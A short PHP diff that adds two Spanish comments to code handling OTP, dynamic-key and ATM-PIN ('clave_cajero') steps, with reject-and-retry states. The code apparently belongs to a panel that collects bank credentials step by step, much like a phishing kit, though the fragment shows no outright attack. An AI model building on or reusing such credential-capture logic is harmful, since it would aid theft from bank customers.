@@ -87,6 +87,7 @@ if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
 
     $estadosRechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];
 
+    // Si está rechazado y NO es reintento, bloqueamos
     if (in_array($estadoActual, $estadosRechazados) && !$esReintento) {
         json_err('La solicitud fue rechazada. Inicie nuevamente.', 403);
     }
@@ -94,6 +95,7 @@ if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
     $updates = [];
     $params = [];
 
+    // Si es reintento, limpiamos los códigos anteriores para que el nuevo OTP se guarde bien
     if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
         $updates[] = "estado = 'pending_otp'";
         $updates[] = "otp_modo = 'otp'";
